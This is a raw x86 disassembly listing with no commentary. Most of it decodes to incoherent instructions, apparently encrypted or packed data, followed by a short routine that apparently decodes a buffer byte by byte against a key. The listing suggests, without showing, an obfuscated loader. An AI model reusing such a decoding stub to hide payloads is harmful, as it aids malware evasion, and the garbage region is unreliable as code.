  416404:	cmp    dl,0x4c
  416407:	ficomp DWORD PTR [ebp-0x16]
  41640a:	ret    
  41640b:	or     BYTE PTR [bp+si-0x3d],ah
  41640f:	aam    0x22
  416411:	or     al,0xb9
  416413:	outs   dx,BYTE PTR ds:[esi]
  416414:	in     eax,0x4a
  416416:	aas    
  416417:	sub    edx,0x8a5027f7
  41641d:	mov    ebp,0x589bc42
  416422:	xchg   ebx,eax
  416423:	fs sti 
  416425:	clc    
  416426:	loope  0x41640a
  416428:	mov    ch,0x4c
  41642a:	sub    esi,DWORD PTR [edx-0x35]
  41642d:	cmp    dh,BYTE PTR [ebx+0x3f81fdd2]
  416433:	shl    ecx,0x2e
  416436:	test   BYTE PTR [ecx-0x7d],dh
  416439:	es pop eax
  41643b:	add    edx,DWORD PTR [edx-0x20395293]
  416441:	mov    ecx,DWORD PTR [edi-0x49]
  416444:	jns    0x4163f8
  416446:	sub    esp,DWORD PTR [ebp+0x57]
  416449:	add    ch,0xb7
  41644c:	ja     0x416464
  41644e:	or     al,0x37
  416450:	fcomip st,st(1)
  416452:	sbb    eax,esp
  416454:	xor    esp,DWORD PTR [eax-0x76]
  416457:	fwait
  416458:	jmp    0xbe8f466e
  41645d:	leave  
  41645e:	out    0xce,eax
  416460:	add    esi,ebx
  416462:	cdq    
  416463:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416464:	add    eax,0xba79f5bf
  416469:	sahf   
  41646a:	cmp    al,0xd0
  41646c:	stc    
  41646d:	aam    0xa1
  41646f:	inc    ecx
  416470:	pop    edx
  416471:	(bad)  
  416472:	js     0x416472
  416474:	mov    ch,0xba
  416476:	int3   
  416477:	or     al,0xce
  416479:	pop    ds
  41647a:	lods   al,BYTE PTR ds:[esi]
  41647b:	mov    cl,0xca
  41647d:	jg     0x4164d7
  41647f:	test   ebp,ecx
  416481:	dec    esi
  416482:	sar    DWORD PTR [edi+edi*4+0x75c5f08a],0x48
  41648a:	adc    esp,eax
  41648c:	les    ebx,FWORD PTR [edi+esi*1+0x38]
  416490:	pop    esp
  416491:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416492:	fbld   TBYTE PTR [ebx]
  416494:	cmp    esi,DWORD PTR [edx]
  416496:	int    0xf3
  416498:	jecxz  0x4164b4
  41649a:	dec    edi
  41649b:	imul   eax,DWORD PTR [eax+0x153f361d],0xffffff9b
  4164a2:	fwait
  4164a3:	push   esi
  4164a4:	daa    
  4164a5:	add    cl,BYTE PTR [ebp+0x58]
  4164a8:	inc    esp
  4164a9:	jo     0x4164ca
  4164ab:	stc    
  4164ac:	ins    BYTE PTR es:[edi],dx
  4164ad:	and    al,0xab
  4164af:	out    0x4a,eax
  4164b1:	test   bl,bl
  4164b3:	(bad)  
  4164b4:	or     al,0xb2
  4164b6:	jl     0x4164cd
  4164b8:	sub    eax,0xc7844dcf
  4164bd:	cmp    eax,0x295f9d92
  4164c2:	inc    eax
  4164c3:	ror    DWORD PTR [eax-0x18],cl
  4164c6:	adc    cl,BYTE PTR [ebp-0x3bc23fad]
  4164cc:	fiadd  DWORD PTR [eax-0x2b]
  4164cf:	mov    al,ds:0x1141412f
  4164d4:	sub    eax,0x270a3229
  4164d9:	pop    ebx
  4164da:	add    DWORD PTR [esi],0x45dbdf80
  4164e0:	mov    edi,0xc01ac684
  4164e5:	jbe    0x416547
  4164e7:	sbb    BYTE PTR [ebx-0x45],bl
  4164ea:	mov    edx,DWORD PTR [edi]
  4164ec:	aas    
  4164ed:	push   cs
  4164ee:	(bad)  
  4164ef:	popa   
  4164f0:	fsubr  QWORD PTR fs:[eax]
  4164f3:	sbb    BYTE PTR [eax+edx*1],al
  4164f6:	sub    DWORD PTR [edi-0xd],0xfffffff8
  4164fa:	lods   eax,DWORD PTR ds:[esi]
  4164fb:	pop    eax
  4164fc:	loopne 0x41650b
  4164fe:	or     al,0xcf
  416500:	inc    ebp
  416501:	out    dx,al
  416502:	or     dl,BYTE PTR ds:0x41ec56b3
  416508:	stc    
  416509:	adc    DWORD PTR [esi],ebx
  41650b:	lahf   
  41650c:	jle    0x416519
  41650e:	jg     0x41656c
  416510:	nop
  416511:	jg     0x4164f6
  416513:	jbe    0x416554
  416515:	test   eax,0x7dd33f24
  41651a:	mov    DWORD PTR [ecx+0x66c3b681],ebp
  416520:	aad    0x82
  416522:	lahf   
  416523:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416524:	adc    bh,BYTE PTR [ecx+0x13a11f99]
  41652a:	cmp    BYTE PTR [esi],dl
  41652c:	adc    al,0xbf
  41652e:	das    
  41652f:	xchg   esp,eax
  416530:	out    0xdd,eax
  416532:	cmp    eax,esi
  416534:	popa   
  416535:	(bad)  
  416536:	jle    0x4164be
  416538:	aad    0x11
  41653a:	sbb    eax,0x65eb445f
  41653f:	push   ds
  416540:	add    cl,BYTE PTR [ebp-0x60]
  416543:	mov    ah,0xd
  416545:	jp     0x416592
  416547:	cmp    ch,BYTE PTR [esi-0x49]
  41654a:	sub    DWORD PTR [ebx-0x2],esp
  41654d:	rcl    BYTE PTR [eax+ebx*1-0x10c56949],1
  416554:	xchg   ebp,eax
  416555:	int3   
  416556:	lods   al,BYTE PTR ds:[esi]
  416557:	adc    dh,BYTE PTR ds:0x3ef9c18d
  41655d:	mov    ah,0xcd
  41655f:	inc    ebx
  416560:	adc    cl,BYTE PTR [ebx+esi*1-0x1]
  416564:	es dec edx
  416566:	pop    edx
  416567:	je     0x416510
  416569:	inc    edi
  41656a:	add    al,0xfb
  41656c:	or     eax,DWORD PTR [esi-0x9ad6909]
  416572:	mov    edx,0x8adf7c74
  416577:	inc    ebx
  416578:	loope  0x4165b8
  41657a:	ret    0xe171
  41657d:	sub    al,0xa6
  41657f:	test   al,0xad
  416581:	inc    ecx
  416582:	test   eax,0x2f8daa26
  416587:	jge    0x41656c
  416589:	push   eax
  41658a:	push   edx
  41658b:	es fs mov ebp,0xf1d70272
  416592:	dec    esp
  416593:	inc    ecx
  416594:	xchg   ebp,eax
  416595:	mov    ch,0xf
  416597:	sub    BYTE PTR [ebx+0x25322cdf],0x0
  41659e:	retf   
  41659f:	dec    eax
  4165a0:	mov    eax,DWORD PTR [edi+0xc]
  4165a3:	idiv   DWORD PTR [ebp-0x5f5fb857]
  4165a9:	sub    ebx,edx
  4165ab:	mov    ds:0x4d5645a6,eax
  4165b0:	dec    edx
  4165b1:	lods   al,BYTE PTR ds:[esi]
  4165b2:	cmp    eax,DWORD PTR [edi-0x57]
  4165b5:	jecxz  0x4165f7
  4165b7:	cmc    
  4165b8:	add    dl,BYTE PTR [esi+0x4e]
  4165bb:	(bad)  
  4165bc:	push   ebp
  4165bd:	idiv   DWORD PTR [ebp-0x4b]
  4165c0:	xor    edx,edi
  4165c2:	add    cl,BYTE PTR [edi+0x54fb34a8]
  4165c8:	jo     0x416607
  4165ca:	sbb    dl,ch
  4165cc:	mov    esp,0x331b71b0
  4165d1:	adc    DWORD PTR gs:[eax*2-0x53547565],eax
  4165d9:	aam    0x73
  4165db:	ffreep st(6)
  4165dd:	outs   dx,DWORD PTR ds:[esi]
  4165de:	repnz loope 0x41660f
  4165e1:	xchg   DWORD PTR [edi+ebx*8-0x5f1c7968],eax
  4165e8:	mov    ds:0x58ed50da,eax
  4165ed:	(bad)  
  4165ee:	shl    DWORD PTR [edi+0xa],1
  4165f1:	xor    dl,bh
  4165f3:	retf   0x3d4c
  4165f6:	imul   ecx,DWORD PTR [edx],0xffffffb4
  4165f9:	or     ecx,0x607e6549
  4165ff:	lods   al,BYTE PTR ds:[esi]
  416600:	in     al,dx
  416601:	pop    esp
  416602:	test   al,0xe
  416604:	jo     0x416678
  416606:	or     ch,BYTE PTR [edx]
  416608:	mov    fs,WORD PTR [ecx]
  41660a:	lea    ebx,[edi-0x2e22d9c9]
  416610:	sbb    cl,dl
  416612:	sar    ebx,cl
  416614:	dec    ebx
  416615:	push   cs
  416616:	fcom   QWORD PTR [eax+eiz*1]
  416619:	(bad)  
  41661a:	out    0xf5,eax
  41661c:	sbb    bh,bh
  41661e:	les    esi,FWORD PTR [edx-0x37c9f28b]
  416624:	xchg   BYTE PTR [eax-0x5b2035d8],cl
  41662a:	sub    esi,DWORD PTR [ebp-0x43dff3bb]
  416630:	cli    
  416631:	xor    al,0x1f
  416633:	or     eax,0x608d80d3
  416638:	loopne 0x416637
  41663a:	call   0x6e3e:0x6aede864
  416641:	in     al,0x61
  416643:	lea    esi,[esi+0x45]
  416646:	stos   DWORD PTR es:[edi],eax
  416647:	mov    dl,0x58
  416649:	aaa    
  41664a:	dec    eax
  41664b:	in     eax,0xf3
  41664d:	lods   eax,DWORD PTR ds:[esi]
  41664e:	imul   ebp,DWORD PTR [ebx-0x1f],0xfb512aae
  416655:	fwait
  416656:	stc    
  416657:	jle    0x416608
  416659:	mov    cl,0x81
  41665b:	(bad)  
  41665c:	fwait
  41665d:	sub    dh,BYTE PTR [edx-0x48]
  416660:	adc    al,0x88
  416662:	pushf  
  416663:	dec    ebx
  416664:	not    BYTE PTR [esi+eax*1]
  416667:	mov    dl,0x46
  416669:	(bad)  
  41666a:	sahf   
  41666b:	icebp  
  41666c:	xor    BYTE PTR [eax+0x78d70781],dl
  416672:	into   
  416673:	push   ebp
  416674:	mov    ah,0x77
  416676:	bound  esi,QWORD PTR [edi]
  416678:	add    al,0x6b
  41667a:	mov    WORD PTR [ecx-0xc],cs
  41667d:	sub    dl,BYTE PTR [ebx+0x43]
  416680:	imul   edx,esi,0xf1844c5c
  416686:	push   ecx
  416687:	fild   DWORD PTR [ecx]
  416689:	icebp  
  41668a:	dec    esi
  41668b:	xchg   ebx,eax
  41668c:	loope  0x41669a
  41668e:	mov    ecx,0x3c3dd0e8
  416693:	jg     0x41664b
  416695:	and    eax,0xcc676eb4
  41669a:	xchg   ebx,eax
  41669b:	lock clc 
  41669d:	fcom   QWORD PTR [eax+0x36]
  4166a0:	sub    ch,BYTE PTR [ebx-0x35]
  4166a3:	dec    edx
  4166a4:	stc    
  4166a5:	shl    dh,1
  4166a7:	jbe    0x4166c2
  4166a9:	fcmovne st,st(5)
  4166ab:	mov    ds:0x2237994a,al
  4166b0:	xor    al,BYTE PTR [esi+eax*2+0x70]
  4166b4:	mov    BYTE PTR [edi],cl
  4166b6:	xchg   esi,eax
  4166b7:	ja     0x4166dd
  4166b9:	mov    ds:0x96d1f893,eax
  4166be:	mov    BYTE PTR [ebp+0x64297be0],0xc
  4166c5:	mov    ds:0x2870212b,eax
  4166ca:	clc    
  4166cb:	js     0x41670f
  4166cd:	out    dx,al
  4166ce:	out    0x10,eax
  4166d0:	les    ebp,FWORD PTR [edi+0x43]
  4166d3:	mov    ds:0x13e2d1ee,al
  4166d8:	(bad)  
  4166d9:	mov    edx,0x511a54f3
  4166de:	retf   
  4166df:	test   eax,edi
  4166e1:	mov    dl,0x5b
  4166e3:	inc    esp
  4166e4:	outs   dx,BYTE PTR ds:[esi]
  4166e5:	leave  
  4166e6:	xor    al,0x45
  4166e8:	push   ds
  4166e9:	bnd ja 0x416744
  4166ec:	jle    0x416753
  4166ee:	popf   
  4166ef:	pusha  
  4166f0:	pop    esp
  4166f1:	sbb    DWORD PTR [eax],0x5aa2cd15
  4166f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4166f8:	pop    ebx
  4166f9:	inc    ecx
  4166fa:	cmp    ah,BYTE PTR [edi]
  4166fc:	inc    ecx
  4166fd:	int3   
  4166fe:	mov    ecx,0xe33fa726
  416703:	and    al,ah
  416705:	push   esp
  416706:	mov    ch,al
  416708:	mov    cl,0x83
  41670a:	in     al,dx
  41670b:	and    BYTE PTR [edx+0xd],0x67
  41670f:	in     al,dx
  416710:	mov    al,0x91
  416712:	xchg   ebx,eax
  416713:	pushf  
  416714:	stos   DWORD PTR es:[edi],eax
  416715:	pop    edx
  416716:	mov    ecx,0xd6cba9df
  41671b:	inc    edi
  41671c:	cmc    
  41671d:	(bad)  
  41671e:	and    bl,BYTE PTR [esi-0x3d]
  416721:	push   edx
  416722:	fidiv  DWORD PTR [edx-0x6e]
  416725:	dec    eax
  416726:	sti    
  416727:	sar    DWORD PTR [eax+0x1a],0x9b
  41672b:	mov    ecx,DWORD PTR [eax-0x5a3ff7e9]
  416731:	sti    
  416732:	test   al,0xf
  416734:	sti    
  416735:	aad    0x57
  416737:	sbb    DWORD PTR [ebx-0x48],esi
  41673a:	(bad)  
  41673c:	push   esp
  41673d:	mov    cl,0x29
  41673f:	push   esp
  416740:	lods   eax,DWORD PTR ds:[esi]
  416741:	lds    ebp,FWORD PTR [ecx+0x73]
  416744:	jb     0x41677f
  416746:	fiadd  DWORD PTR [eax+0x33]
  416749:	cmc    
  41674a:	add    ebx,ecx
  41674c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41674d:	xchg   esp,eax
  41674e:	cmp    BYTE PTR [edi+eax*4],bl
  416751:	clc    
  416752:	lahf   
  416753:	ror    DWORD PTR [eax],1
  416755:	add    dl,bh
  416757:	clc    
  416758:	(bad)  
  416759:	sub    al,0xd
  41675b:	jno    0x4166e7
  41675d:	pusha  
  41675e:	icebp  
  41675f:	mov    eax,0x847292e4
  416764:	cmp    dl,ah
  416766:	sbb    BYTE PTR [ecx-0x36],cl
  416769:	push   es
  41676a:	fisttp QWORD PTR [edi]
  41676c:	out    dx,al
  41676d:	inc    ebx
  41676e:	(bad)  
  41676f:	out    dx,eax
  416770:	mov    BYTE PTR [edi+0x1a],bl
  416773:	mov    ebx,0x1c7172cc
  416778:	icebp  
  416779:	mov    ?,WORD PTR [eax+0xe7ac8c8]
  41677f:	inc    ecx
  416780:	mov    bl,dh
  416782:	xor    DWORD PTR [ebp-0x80],ebx
  416785:	test   eax,0xcba0ae03
  41678a:	rcr    BYTE PTR [edx-0x7437f180],0xa5
  416791:	imul   esi,DWORD PTR [eax+0x757f3fe8],0xaa813be2
  41679b:	mov    ebx,0x309b9cc2
  4167a0:	push   ss
  4167a1:	push   es
  4167a2:	fnsave [edi+edi*8+0x36]
  4167a6:	pop    ds
  4167a7:	xchg   ebp,eax
  4167a8:	stos   DWORD PTR es:[edi],eax
  4167a9:	jp     0x416757
  4167ab:	iret   
  4167ac:	icebp  
  4167ad:	add    eax,0x5bb481ac
  4167b2:	mov    BYTE PTR [ebx-0x140781d5],0xae
  4167b9:	ja     0x416817
  4167bb:	rcl    DWORD PTR [esi+0x42],0xb7
  4167bf:	(bad)
  4167c3:	mov    ch,0xf7
  4167c5:	or     eax,esi
  4167c7:	cmp    eax,0xc8ec4a24
  4167cc:	xor    edx,ecx
  4167ce:	jl     0x4167df
  4167d0:	xor    eax,0x40ab1902
  4167d5:	leave  
  4167d6:	xchg   edx,eax
  4167d7:	dec    esp
  4167d8:	adc    cl,BYTE PTR [ecx+edi*2-0x1b620e9f]
  4167df:	das    
  4167e0:	xor    eax,0xe1ce9042
  4167e5:	lea    ebp,[ebp+0x1f]
  4167e8:	sbb    dl,dl
  4167ea:	jmp    0x6b700061
  4167ef:	cwde   
  4167f0:	jmp    0xd9a5:0x38568504
  4167f7:	jecxz  0x416781
  4167f9:	fidiv  DWORD PTR [ebp-0x419293bb]
  4167ff:	and    edx,DWORD PTR [esi+0x1a]
  416802:	lods   al,BYTE PTR ds:[esi]
  416803:	icebp  
  416804:	(bad)
  416807:	pop    ds
  416808:	jo     0x41679d
  41680a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41680b:	test   BYTE PTR [ebx+0x3fc57d4a],al
  416811:	or     BYTE PTR [esi],cl
  416813:	icebp  
  416814:	push   ebp
  416815:	inc    edi
  416816:	je     0x4167ca
  416818:	cmp    al,0xc6
  41681a:	(bad)  
  41681b:	int3   
  41681c:	mov    ds:0xf8a198a6,al
  416821:	enter  0x8618,0x13
  416825:	xchg   esi,eax
  416826:	push   edi
  416827:	inc    ebp
  416828:	jg     0x416896
  41682a:	jmp    0x416891
  41682c:	dec    esp
  41682d:	xor    al,0x8e
  41682f:	les    edx,FWORD PTR [ecx]
  416831:	adc    esi,ecx
  416833:	pop    ecx
  416834:	inc    esp
  416835:	jns    0x4167d5
  416837:	jg     0x4168ad
  416839:	sbb    DWORD PTR [ebx],0xffffffee
  41683c:	(bad)
  41683f:	mov    DWORD PTR [eax],0x768108a5
  416845:	xchg   ebp,eax
  416846:	sbb    DWORD PTR [ebx+0x43],0x5795c42c
  41684d:	push   ds
  41684e:	push   eax
  41684f:	dec    ebx
  416850:	rol    DWORD PTR [edx+0x2f],1
  416853:	xchg   DWORD PTR [esp+eax*2],ecx
  416856:	add    eax,edi
  416858:	fimul  WORD PTR [ecx]
  41685a:	jl     0x416862
  41685c:	adc    ebp,esi
  41685e:	sub    bl,BYTE PTR [ebp+0x62]
  416861:	scas   eax,DWORD PTR es:[edi]
  416862:	and    ecx,esp
  416864:	in     ax,dx
  416866:	loope  0x41682f
  416868:	pop    ebp
  416869:	pop    ecx
  41686a:	pop    es
  41686b:	or     dl,ch
  41686d:	and    al,0x88
  41686f:	stc    
  416870:	outs   dx,DWORD PTR ds:[esi]
  416871:	fcmovnbe st,st(2)
  416873:	cwd    
  416875:	fstp   DWORD PTR [ecx]
  416877:	pushf  
  416878:	xor    dh,ch
  41687a:	(bad)  
  41687b:	sti    
  41687c:	mov    bh,0x67
  41687e:	add    al,0x8a
  416880:	not    DWORD PTR [ebp+0x4c13a545]
  416886:	inc    BYTE PTR [ebx-0x3f5c4e8a]
  41688c:	call   0x76f7:0x50182d6e
  416893:	xchg   ebx,eax
  416894:	mov    dh,BYTE PTR [ecx+0x11]
  416897:	shr    edi,0x5a
  41689a:	or     ebp,edi
  41689c:	xchg   edx,eax
  41689d:	xor    ah,BYTE PTR [ebp+0x5b]
  4168a0:	pop    ecx
  4168a1:	jns    0x416875
  4168a3:	mov    ds:0x57413938,al
  4168a8:	(bad)  
  4168a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4168aa:	mov    bh,0x7c
  4168ac:	mov    ds:0x93cb8ff3,eax
  4168b1:	sub    eax,0x398c9fd3
  4168b6:	jno    0x416862
  4168b8:	push   edx
  4168b9:	mov    dh,0x61
  4168bb:	xor    DWORD PTR ds:0x7cf9957,esp
  4168c1:	inc    edx
  4168c2:	sub    DWORD PTR [edx],esp
  4168c4:	scas   al,BYTE PTR es:[edi]
  4168c5:	loopne 0x416906
  4168c7:	and    ecx,esi
  4168c9:	es adc eax,0xbb81fc41
  4168cf:	nop
  4168d0:	sti    
  4168d1:	sub    eax,0x351e24b2
  4168d6:	cmp    BYTE PTR [ebx+0x36],bh
  4168d9:	push   es
  4168da:	add    bl,BYTE PTR [edx-0x163b45b1]
  4168e0:	data16 repz sbb dl,dh
  4168e4:	int3   
  4168e5:	fisttp DWORD PTR [ecx]
  4168e7:	and    BYTE PTR [eax-0x6b],cl
  4168ea:	hlt    
  4168eb:	loope  0x4168b6
  4168ed:	call   0xe6c4:0x44ddc41d
  4168f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4168f5:	shl    bh,cl
  4168f7:	rcl    DWORD PTR [edx],cl
  4168f9:	cli    
  4168fa:	pop    ebp
  4168fb:	push   esp
  4168fc:	nop
  4168fd:	mov    eax,ds:0x94a8ba95
  416902:	rcl    DWORD PTR ds:0x9a01aac8,cl
  416908:	mov    DWORD PTR [esi],esp
  41690a:	add    eax,0x7d288d54
  41690f:	mov    ebx,0x544beb5b
  416914:	push   edx
  416915:	loope  0x41691d
  416917:	pop    eax
  416918:	xor    al,0xee
  41691a:	sub    eax,0x6d79e592
  41691f:	push   ss
  416920:	ror    ebp,cl
  416922:	mov    esi,0xaa40b3a3
  416927:	sbb    BYTE PTR [ebx+0x6e],0xd7
  41692b:	add    BYTE PTR [ebp-0x7e],bl
  41692e:	sub    ecx,edx
  416930:	out    dx,al
  416931:	shr    BYTE PTR ds:0x70338673,cl
  416937:	jmp    0xfa5a:0xf2122445
  41693e:	inc    BYTE PTR [edi+0x2f8d981f]
  416944:	cdq    
  416945:	and    ecx,DWORD PTR [ecx+0x33]
  416948:	xchg   ebp,eax
  416949:	xchg   edx,eax
  41694a:	mov    al,0x77
  41694c:	sub    ebp,DWORD PTR [edx+0x5ebe137c]
  416952:	or     al,0xe
  416954:	push   es
  416955:	jmp    0x416974
  416957:	call   0xc4e6f264
  41695c:	rcl    DWORD PTR [eax+0x62da0c2d],0xe4
  416963:	push   ebp
  416964:	push   ss
  416965:	xchg   BYTE PTR [eax-0x61],dl
  416968:	sub    eax,0xfa298ef0
  41696d:	mov    ebp,0x2e974eb
  416972:	fldenv [edi-0x66]
  416975:	inc    eax
  416976:	jns    0x41690f
  416978:	mov    edi,0x59ac7da8
  41697d:	sub    DWORD PTR [ecx],edx
  41697f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416980:	mov    dl,0xe7
  416982:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416983:	in     al,dx
  416984:	fist   WORD PTR [eax-0x41b65cde]
  41698a:	and    dl,BYTE PTR [ebp+eiz*4+0x758b3c97]
  416991:	cld    
  416992:	call   esi
  416994:	mov    DWORD PTR [ebp-0x38],eax
  416997:	cmp    DWORD PTR [ebp-0x38],0x57
  41699b:	jne    0x4169a9
  41699d:	mov    edx,DWORD PTR [ebp-0x20]
  4169a0:	push   edx
  4169a1:	call   0x401000
  4169a6:	add    esp,0x4
  4169a9:	xor    eax,eax
  4169ab:	pop    esi
  4169ac:	mov    esp,ebp
  4169ae:	pop    ebp
  4169af:	ret    
  4169b0:	push   ebp
  4169b1:	mov    ebp,esp
  4169b3:	sub    esp,0x124
  4169b9:	xor    eax,eax
  4169bb:	mov    esp,ebp
  4169bd:	pop    ebp
  4169be:	ret    
  4169bf:	push   ebp
  4169c0:	mov    ebp,esp
  4169c2:	sub    esp,0x2c
  4169c5:	push   ebx
  4169c6:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  4169cd:	mov    DWORD PTR [ebp-0xc],0x0
  4169d4:	mov    DWORD PTR [ebp-0x20],0x1
  4169db:	mov    DWORD PTR [ebp-0x10],0x0
  4169e2:	mov    eax,DWORD PTR [ebp+0xc]
  4169e5:	mov    DWORD PTR [ebp-0x1c],eax
  4169e8:	mov    DWORD PTR [ebp-0x18],0x0
  4169ef:	mov    DWORD PTR [ebp-0x8],0x0
  4169f6:	mov    DWORD PTR [ebp-0x24],0x0
  4169fd:	mov    ecx,DWORD PTR [ebp-0x4]
  416a00:	sub    ecx,0x1
  416a03:	mov    DWORD PTR [ebp-0x4],ecx
  416a06:	mov    edx,DWORD PTR [ebp+0x8]
  416a09:	mov    DWORD PTR [ebp-0x10],edx
  416a0c:	mov    DWORD PTR [ebp-0x28],0x1
  416a13:	mov    eax,DWORD PTR [ebp-0x4]
  416a16:	add    eax,0x2
  416a19:	mov    DWORD PTR [ebp-0x4],eax
  416a1c:	mov    ecx,DWORD PTR [ebp-0x1c]
  416a1f:	add    ecx,DWORD PTR [ebp-0x4]
  416a22:	mov    dl,BYTE PTR [ecx+0x1]
  416a25:	mov    BYTE PTR [ebp-0x11],dl
  416a28:	mov    eax,DWORD PTR [ebp-0x4]
  416a2b:	add    eax,0x1
  416a2e:	mov    DWORD PTR [ebp-0x4],eax
  416a31:	mov    cl,BYTE PTR [ebp-0x11]
  416a34:	mov    BYTE PTR [ebp-0x29],cl
  416a37:	push   edx
  416a38:	pop    ebx
  416a39:	mov    ecx,ebx
  416a3b:	mov    edx,DWORD PTR [ebp-0x10]
  416a3e:	add    edx,DWORD PTR [ebp-0x4]
  416a41:	mov    al,BYTE PTR [ebp-0x29]
  416a44:	mov    BYTE PTR [edx],al
  416a46:	mov    ebx,esi
  416a48:	mov    ecx,DWORD PTR [ebp+0x14]
  416a4b:	add    ecx,DWORD PTR [ebp-0x8]
  416a4e:	movzx  edx,BYTE PTR [ecx]
  416a51:	mov    DWORD PTR [ebp-0xc],edx
  416a54:	mov    eax,DWORD PTR [ebp-0x8]
  416a57:	mov    ecx,DWORD PTR [ebp-0x28]
  416a5a:	add    eax,ecx
  416a5c:	mov    DWORD PTR [ebp-0x8],eax
  416a5f:	mov    eax,DWORD PTR [ebp-0x8]
  416a62:	shr    eax,0x3
  416a65:	mov    ecx,0x1
  416a6a:	sub    ecx,eax
  416a6c:	mov    DWORD PTR [ebp-0x20],ecx
  416a6f:	shr    eax,cl
  416a71:	mov    edx,DWORD PTR [ebp-0x8]
  416a74:	imul   edx,DWORD PTR [ebp-0x20]
  416a78:	mov    DWORD PTR [ebp-0x8],edx
  416a7b:	shl    ebx,0x3
  416a7e:	mov    eax,DWORD PTR [ebp-0x10]
  416a81:	add    eax,DWORD PTR [ebp-0x4]
  416a84:	movzx  ecx,BYTE PTR [eax]
  416a87:	add    ecx,DWORD PTR [ebp-0xc]
  416a8a:	mov    edx,DWORD PTR [ebp-0x10]
  416a8d:	add    edx,DWORD PTR [ebp-0x4]
  416a90:	mov    BYTE PTR [edx],cl
  416a92:	mov    eax,DWORD PTR [ebp-0x4]
  416a95:	sub    eax,0x2
  416a98:	mov    DWORD PTR [ebp-0x4],eax
  416a9b:	mov    ecx,DWORD PTR [ebp-0x4]
  416a9e:	cmp    ecx,DWORD PTR [ebp+0x10]
  416aa1:	jl     0x416a13
  416aa7:	pop    ebx
  416aa8:	mov    esp,ebp
  416aaa:	pop    ebp
  416aab:	ret    
  416aac:	jmp    DWORD PTR ds:0x417020
